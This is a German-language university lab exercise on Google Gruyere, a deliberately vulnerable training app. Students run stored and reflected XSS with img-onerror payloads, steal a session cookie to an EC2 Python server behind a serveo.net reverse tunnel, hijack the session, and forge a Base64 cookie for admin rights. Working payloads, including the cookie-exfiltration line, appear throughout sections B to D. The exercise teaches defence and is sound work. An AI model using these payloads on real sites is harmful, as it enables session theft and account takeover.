## A) Gruyere starten und Accounts erstellen (20%)

Navigieren Sie im Browser zu [https://google-gruyere.appspot.com/start](https://google-gruyere.appspot.com/start).

Klicken Sie auf **Sign up** und erstellen Sie **zwei Accounts**. Einen nennen Sie **angreifer-[ihrVorname]**, den anderen **verteidiger-[ihrVorname]**. Verwenden Sie ein einfaches Passwort.

Öffnen Sie für den Verteidiger-Account ein **zweites Browserfenster** (oder Inkognito-Tab) und loggen Sie sich dort ein – so simulieren Sie zwei unabhängige Benutzer im selben Browser.

## B) Stored XSS in Gruyere

### Hintergrund

Bei **Stored XSS** (Cross-Site Scripting) injiziert ein Angreifer schadhaften JavaScript-Code, der in der Datenbank einer Webapplikation gespeichert wird. Bei jedem Seitenaufruf wird dieser Code ausgeführt – auch bei anderen Benutzern. Ein einziger Eintrag kann somit beliebig viele Opfer treffen.

Browser wie Brave blockieren `<script>`-Tags in Formularfeldern. Angreifer weichen deshalb auf alternative Payload-Formen aus – etwa auf HTML-Event-Handler wie `onerror`.

---

### B1 – DOM-Manipulation als Proof of Concept

1. Loggen Sie sich als **angreifer-[ihrVorname]** ein und navigieren Sie zu **Home**.
2. Tragen Sie folgenden Payload in das Snippets-Eingabefeld ein und klicken Sie auf **Submit**:

```html
<img src="x" onerror="document.querySelector('.menu').style.backgroundColor = 'red'">
```

3. Laden Sie die Seite neu. Was beobachten Sie?
4. Öffnen Sie ein **zweites Browserfenster** (oder Inkognito) und loggen Sie sich als **verteidiger-[ihrVorname]** ein. Navigieren Sie zur Startseite. Was passiert dort?

**Antworten Sie schriftlich:**

1. Warum konnte dieser Payload die Sicherheitsprüfung des Browsers umgehen, obwohl `<script>` blockiert wird?
2. Was bedeutet es für die Sicherheit, dass der Payload auch im Browser des Verteidigers ausgeführt wird?
3. Welche OWASP Top 10 Kategorie (2025) beschreibt Stored XSS? Nennen Sie Nummer und Bezeichnung.
4. Was hätte die Applikation tun müssen, damit dieser Payload harmlos bleibt? (Stichwort: Output Encoding)

**Abgabe B1:**

- Screenshot des veränderten Menüs (roter Hintergrund).
- Screenshot desselben Effekts im Fenster des Verteidigers.
- Schriftliche Antworten auf die vier Fragen.

### B2 – Cookies: Was sie sind und warum sie gefährlich sind

Cookies sind kleine Datenpakete, die der Browser für eine Webseite speichert. **Session-Cookies** enthalten eine eindeutige ID, mit der der Server weiss, welcher Benutzer angemeldet ist. Wer diesen Cookie kennt, kann die Identität des Benutzers übernehmen – ohne Passwort.

1. Öffnen Sie die **Browser DevTools** (F12) → Tab **Application** (Chrome/Brave) oder **Storage** (Firefox) → **Cookies** → wählen Sie die Gruyere-URL.
2. Notieren Sie Namen und Wert des Gruyere-Cookies.
3. Fügen Sie als **angreifer-[ihrVorname]** folgenden Payload im Snippets-Feld ein:

```html
<img src="x" onerror="this.insertAdjacentHTML('afterend','<div style=background:#c00;color:#fff;padding:8px;margin:4px 0>Sichtbares Cookie: ' + document.cookie + '</div>')">
```

4. Laden Sie die Seite neu. Wessen Cookie wird im roten Kasten angezeigt – Ihrer oder der des Verteidigers?
5. Wechseln Sie zum Fenster des **Verteidigers** und navigieren Sie zur Startseite. Welches Cookie erscheint dort?

**Antworten Sie schriftlich:**

1. Was kann ein Angreifer tun, wenn er den Session-Cookie eines anderen Benutzers kennt?
2. Was bewirkt das `HttpOnly`-Flag bei einem Cookie und wie schützt es vor diesem Angriff?
3. Warum ist es gefährlich, Session-Cookies im `localStorage` statt in einem `HttpOnly`-Cookie zu speichern?

**Abgabe B2:**

- Screenshot der DevTools mit sichtbarem Cookie-Wert.
- Screenshot des roten Kastens im Fenster des Angreifers (eigenes Cookie).
- Screenshot des roten Kastens im Fenster des Verteidigers (Cookie des Verteidigers).
- Schriftliche Antworten auf die drei Fragen.

### B3 – Session-Hijacking: Cookie-Exfiltration zum Angreifer-Server

In B2 wurde der Cookie nur im Browser des Opfers angezeigt – der Angreifer konnte ihn nicht sehen. In einem echten Angriff sendet der Payload den Cookie automatisch an einen Server des Angreifers. Das simulieren wir jetzt: Die EC2-Instanz übernimmt die Rolle des Angreifer-Servers.

**Rollen:**
- **Browserfenster 1:** angreifer-[ihrVorname]
- **Browserfenster 2:** verteidiger-[ihrVorname]
- **SSH-Terminal 1:** Angreifer-Server (Python HTTP-Server auf EC2)
- **SSH-Terminal 2:** Serveo-Tunnel (öffentliche HTTPS-URL für den Server)

---

**Schritt 1 – Port 9000 in der Security Group freigeben**

Gruyere läuft auf `appspot.com` unter **HTTPS**. Moderne Browser blockieren sogenannte *Mixed Content*: Eine HTTPS-Seite darf keine HTTP-Anfragen ins Internet schicken. Der Angreifer-Server auf EC2 wäre jedoch nur per HTTP erreichbar. Um dieses Problem zu lösen, verwenden wir **serveo.net** – einen kostenlosen SSH-Tunnel-Dienst, der dem lokalen Server eine öffentliche HTTPS-URL gibt.

Für den Tunnel braucht EC2 keine öffentlich erreichbaren Ports für den Angreifer-Server – der ausgehende SSH-Tunnel genügt. Öffnen Sie trotzdem Port **9000** in der Security Group `m183-sg` für **My IP** (für direkte Tests):

Navigieren Sie zu **EC2** → **Security Groups** → `m183-sg` → **Inbound rules** → **Edit inbound rules**:

| Type | Protocol | Port range | Source |
|------|----------|------------|--------|
| Custom TCP | TCP | 9000 | **My IP** |

---

**Schritt 2 – Angreifer-Server starten (SSH-Terminal 1)**

Verbinden Sie sich via SSH mit Ihrer EC2-Instanz. Starten Sie einen einfachen Python-HTTP-Server auf Port 9000:

```bash
python3 -m http.server 9000
```

**Warum `python3 -m http.server`?** Python bringt einen eingebauten HTTP-Server mit, der ohne Installation sofort startet. Er loggt jede eingehende Anfrage in der Konsole – inklusive der vollen URL mit allen Query-Parametern. So sehen wir den gestohlenen Cookie, sobald er ankommt. In der Realität würde ein Angreifer hier einen eigenen Server oder ein Logging-Backend betreiben.

Lassen Sie dieses Terminal offen.

---

**Schritt 3 – HTTPS-Tunnel starten (SSH-Terminal 2)**

Öffnen Sie eine **zweite SSH-Verbindung** zur EC2-Instanz. Starten Sie dort den Serveo-Tunnel:

```bash
ssh -R 80:localhost:9000 serveo.net
```

**Warum `ssh -R 80:localhost:9000 serveo.net`?** Dieser Befehl öffnet einen *Reverse-SSH-Tunnel*: Serveo.net stellt einen öffentlich erreichbaren HTTPS-Endpunkt bereit und leitet eingehende Anfragen über die SSH-Verbindung an Port 9000 auf Ihrer EC2-Instanz weiter. Das Flag `-R 80:localhost:9000` bedeutet: «Binde auf dem Remote-Server (serveo.net) Port 80, und leite Anfragen daran an `localhost:9000` (also den Python-Server) weiter.» Serveo stellt den Port 80 automatisch als HTTPS bereit.

Nach wenigen Sekunden erscheint in der Ausgabe eine URL der Form:

```
Forwarding HTTP traffic from https://abc123.serveo.net
```

Kopieren Sie diese URL – das ist die öffentliche HTTPS-Adresse Ihres Angreifer-Servers. Der Browser des Opfers wird Cookies an diese URL schicken.

Lassen Sie auch dieses Terminal offen.

---

**Schritt 4 – Payload platzieren (als Angreifer, Browserfenster 1)**

Löschen Sie die bisherigen Snippets aus B2 oder erstellen Sie einen neuen. Ersetzen Sie `<SERVEO-URL>` durch Ihre Serveo-URL (z.B. `https://abc123.serveo.net`) und tragen Sie folgenden Payload ein:

```html
<img src="x" onerror="new Image().src='<SERVEO-URL>/?c='+encodeURIComponent(document.cookie)">
```

**Was passiert:** Sobald jemand die Seite lädt, löst der `onerror`-Handler aus. `new Image().src=...` veranlasst den Browser, im Hintergrund eine GET-Anfrage an die Serveo-URL zu schicken – mit dem Cookie als URL-Parameter `c`. Der Besucher bemerkt nichts davon. Da die Serveo-URL HTTPS ist, erlaubt der Browser diese Anfrage auch von der HTTPS-Gruyere-Seite aus (kein Mixed-Content-Block).

---

**Schritt 5 – Cookie stehlen (als Verteidiger, Browserfenster 2)**

Wechseln Sie zu Browserfenster 2 (Verteidiger) und laden Sie die Gruyere-Startseite.

Schauen Sie danach in **SSH-Terminal 1** (Python-Server) nach. Sie sollten dort eine Zeile ähnlich dieser sehen:

```
<IP> - - [Datum] "GET /?c=GRUYERE_COOKIE_WERT HTTP/1.1" 200 -
```

Kopieren Sie den Cookie-Wert aus dem URL-Parameter (der Teil nach `?c=`). Dekodieren Sie ihn falls nötig (`%3D` = `=`, `%3B` = `;`).

---

**Schritt 6 – Sitzung übernehmen (als Angreifer, Browserfenster 1)**

1. Öffnen Sie DevTools → **Application** → **Cookies** → Gruyere-URL.
2. Ersetzen Sie den aktuellen Cookie-Wert durch den kopierten Wert des Verteidigers.
3. Laden Sie die Seite neu.

Unter welchem Benutzernamen sind Sie jetzt eingeloggt?

---

**Antworten Sie schriftlich:**

1. Warum konnte der Angreifer den Cookie des Verteidigers erhalten, ohne je dessen Passwort zu kennen oder Zugriff auf dessen Browser zu haben?

5. Was bewirkt das `Secure`-Flag bei einem Cookie, und in welcher Situation schützt es?

## C) Reflected XSS in Gruyere

### Hintergrund

Bei **Reflected XSS** wird der Payload nicht gespeichert, sondern direkt in einer URL übergeben und vom Server sofort in die Antwort zurückgespiegelt («reflected»). Nur wer den manipulierten Link öffnet, ist betroffen – im Gegensatz zu Stored XSS, das jeden Besucher trifft.

### Schritt 1 – Reflexion finden

Das Ziel: Eine Seite in Gruyere finden, wo Ihre Eingabe aus der URL direkt im HTML der Antwort erscheint – ohne gespeichert zu werden.

**1. Ihre UID notieren**

Ihre UID steht als lange Zahl im URL-Pfad, sobald Sie eingeloggt sind:

```
https://google-gruyere.appspot.com/526849990317448319389332894006916653579/
                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                   das ist Ihre UID
```

**2. Alle Seiten von Gruyere durchklicken – mit DevTools beobachten**

Öffnen Sie **DevTools → Network** (F12). Klicken Sie nun systematisch jede Seite von Gruyere an: Home, Profil, Snippet-Seiten, Formularseiten. Beobachten Sie dabei jeweils die URL in der Adressleiste – notieren Sie alle Seiten, die **GET-Parameter** haben (erkennbar am `?parameter=wert` am Ende).

**3. Parameter auf Reflexion testen**

Für jeden gefundenen GET-Parameter: Ersetzen Sie den aktuellen Wert durch `HELLOTEST` und laden Sie die Seite neu. Suchen Sie danach auf der Seite (Ctrl+F) nach `HELLOTEST`.

- **Gefunden auf der Seite?** → Der Parameter wird direkt in die Antwort eingefügt. Das ist der Reflection-Punkt.
- **Nicht gefunden?** → Nächsten Parameter testen.

**4. HTML-Injection bestätigen**

Sobald Sie einen Parameter gefunden haben, der auf der Seite erscheint: Ersetzen Sie `HELLOTEST` durch `<h1>HELLOTEST</h1>` und laden Sie neu.

- Erscheint **HELLOTEST** als grosse Überschrift gerendert? → HTML-Injection bestätigt. Der Server fügt Ihre Eingabe als rohen HTML-Code in die Seite ein.
- Erscheint `<h1>HELLOTEST</h1>` wortwörtlich mit sichtbaren spitzen Klammern? → Der Server escaped korrekt. Anderen Parameter suchen.

> **Tipp:** Auch Fehlermeldungen sind häufige Reflection-Punkte. Versuchen Sie eine ungültige Seite aufzurufen, z.B. `https://google-gruyere.appspot.com/<ihre-uid>/nichtvorhanden` und schauen Sie ob etwas aus der URL in der Fehlermeldung erscheint.

### Schritt 2 – XSS-Payload einschleusen

Ersetzen Sie den harmlosen HTML-Tag durch einen JavaScript-Payload. Verwenden Sie `<img onerror>` statt `<script>`, da Brave letzteren beim Versenden blockiert:

```
https://google-gruyere.appspot.com/<ihre-uid>/snippets?uid=<img src=x onerror=alert('Reflected XSS')>
```

1. Öffnen Sie diese URL direkt im Browser (kopieren Sie sie in die Adressleiste).
2. Was passiert? Wird der Alert ausgelöst?
3. Öffnen Sie **DevTools → Network** und suchen Sie die Anfrage. Schauen Sie im **Response**-Tab: Sehen Sie Ihren Payload im HTML-Quelltext der Antwort?

### Schritt 3 – Unterschied zu Stored XSS verstehen

1. Schicken Sie den manipulierten Link (mit dem Payload in der URL) an den **verteidiger-[ihrVorname]** (kopieren Sie ihn ins andere Browserfenster).
2. Öffnen Sie den Link im Fenster des Verteidigers. Was passiert?
3. Navigieren Sie jetzt ohne den Payload einfach zur normalen Startseite des Verteidigers. Wird der Alert dort auch ausgelöst?

**Antworten Sie schriftlich:**

1. Was ist der Hauptunterschied zwischen Stored XSS und Reflected XSS hinsichtlich Persistenz und Reichweite? (Antwort aus Schritt 3 ableiten)
2. Wie würde ein Angreifer in der Praxis vorgehen, um das Opfer dazu zu bringen, den manipulierten Link zu öffnen? (Social Engineering)
3. Welcher OWASP Proactive Control schützt am direktesten gegen XSS? Nennen Sie ihn mit Nummer und Titel. (Referenz: [owasp.org/www-project-proactive-controls](https://owasp.org/www-project-proactive-controls/))

**Abgabe:**

- Screenshot von DevTools → Network → Response mit dem Payload im HTML-Quelltext.
- Screenshot des ausgeführten Alerts mit dem Payload sichtbar in der URL.
- Schriftliche Antworten auf die drei Fragen.

## D) Client-State Manipulation in Gruyere

### Hintergrund

Gruyere speichert Benutzerinformationen (z.B. die Admin-Rolle) in einem Cookie. Weil Cookies im Browser des Benutzers liegen, kann ein Angreifer diese direkt manipulieren – sofern die Applikation die Daten nicht serverseitig validiert.

### Aufgabe

1. Loggen Sie sich in Gruyere mit einem normalen Benutzerkonto ein.
2. Öffnen Sie die **Browser DevTools** (F12) → Tab **Application** (Chrome) oder **Storage** (Firefox) → **Cookies**.
3. Suchen Sie das Gruyere-Cookie. Analysieren Sie seinen Inhalt (er ist Base64-kodiert – dekodieren Sie ihn im EC2-Terminal mit `echo '<wert>' | base64 -d` oder direkt im Browser mit `atob('<wert>')` in der DevTools-Konsole).
4. Verändern Sie den Cookie-Wert so, dass Ihr Benutzer Admin-Rechte erhält. Navigieren Sie zu **Part 3 – Client-State Manipulation** auf [google-gruyere.appspot.com/part3](https://google-gruyere.appspot.com/part3) für Hinweise.
5. Laden Sie die Seite neu. Hat die Manipulation gewirkt?

**Antworten Sie schriftlich:**

1. Warum ist es gefährlich, sicherheitsrelevante Daten (wie Rollen oder Berechtigungen) im Client (Cookie/LocalStorage) zu speichern?
2. Wo sollten Berechtigungsprüfungen stattfinden – im Client oder auf dem Server? Begründen Sie.
3. Welche OWASP Top 10 Kategorie (2025) beschreibt dieses Problem?

**Abgabe:**

- Screenshot der DevTools mit sichtbarem Cookie-Inhalt (vor der Manipulation).
- Screenshot der Applikation nach erfolgreicher Manipulation (erhöhte Rechte sichtbar).
- Schriftliche Antworten auf die drei Fragen.
